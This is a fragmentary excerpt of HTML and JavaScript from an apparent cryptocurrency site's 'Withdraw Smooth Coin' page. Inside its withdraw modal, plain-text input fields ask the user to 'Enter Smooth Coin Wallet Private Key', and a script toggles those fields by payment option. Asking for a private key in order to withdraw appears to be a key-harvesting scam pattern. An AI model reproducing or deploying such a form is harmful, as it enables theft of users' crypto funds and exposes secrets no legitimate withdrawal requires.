    ...
    <div class="nk-content nk-content-fluid">
        <div class="container-xl wide-lg">
            <div class="nk-content-body">
                <div class="buysell  ">
                    <div class="buysell-title text-center"><h4 class="title">Withdraw Smooth Coin</h4></div>
                            ...
                            <div class="buysell-field form-group">
                                        ...
                                        <div class="col-md-12">
                                            <script type="text/javascript">
                                                ...
                                                function goDoSomething3(identifier) {
                                                    ...
                                                    document.getElementById("gateway3").innerHTML = "Enter " + $(identifier).data('id') + " Wallet Address Bellow";
                                ...
                                <script>
                                    function showDiv(prefix, chooser) {
                                        ...
                                        if (selectedOption == "1") {
                                            displayDiv(prefix, "1");
                                            var div=document.getElementById('checking_flag');
                                            div.style.display='none';
                                        ...
                                        if (selectedOption == "4") {
                                            ...
                                            var div=document.getElementById('checking_flag');
                                            div.style.display='none';
                                            var div2 = document.getElementById('crypto_deposit');
                                            var div1 = document.getElementById('paypal_deposit');
                                            div1.style.display='block';
                                            div2.style.display='none';
                                        }
                                    }
                                ...
                                <div class="buysell-field form-action" id="crypto_deposit">
                                    <button type="button" data-toggle="modal" data-target="#buy-coin"
                                            class="btn btn-lg  btn-outline btn-primary">Withdraw
                                    </button>
                                </div>
                                        ...
                                        <div class="modal-body modal-body-lg">
                                            <div class="nk-block-head nk-block-head-xs text-center">
                                                ...
                                                <div class="nk-block-text">
                                                    <div class="caption-text">You are about to trade <strong><a
                                            ...
                                            <div class="nk-block">
                                                <div class="buysell-overview">
                                                    <ul class="buysell-overview-list">
                                                        ...
                                                        <li class="buysell-overview-item"><span
                                                                class="pm-title">Withdraw</span>
                                                            <span class="pm-currency"><a
                                                                    id="total_buy">0.00</a>SMC</span>
                                                        </li>
                                                        <li class="buysell-overview-item"><span
                                                                class="pm-title">Receive</span>
                                                            <span class="pm-currency"><a
                                                ...
                                                <div class="buysell-field form-group">
                                                    ...
                                                    <div class="buysell-field form-group">
                                                        ...
                                                        <br>
                                                        <div id="checking_flag" style="display:none">
                                                            <div class="form-label-group">
                                                                <label class="form-label">
                                                                    <a>Enter Smooth Coin Wallet Private Key Bellow</a>
                                                                </label>
                                                            </div>
                                                            <div class="form-control-group">
                                                                <input type="test" class="form-control form-control-lg  r"
                                                                    name="stellarwallet_private_key"/>
                                                                <div class="form-dropdown">
                                                                    <div class="coin-icon" id="icon1"><em
                                                                            class="icon ni ni-wallet"></em>
                                                                    </div>
                                            ...
                                            <div class="nk-block">
                                                ...
                                                <div class="buysell-field form-group">
                                                    ...
                                                    <div class="buysell-field form-group">
                                                        ...
                                                        <br>
                                                        <!-- <div class="form-control-group">
                                                            <input type="test" id="private_keyss" class="form-control form-control-lg  r"
                                                        ...
                                                        <div class="form-label-group">
                                                            <label class="form-label">
                                                                <a>Enter the Smooth Coin Wallet Private Key Bellow</a>
                                                            </label>
                                                        </div>
                                                        <div class="form-control-group">
                                                            <input type="test" class="form-control form-control-lg"
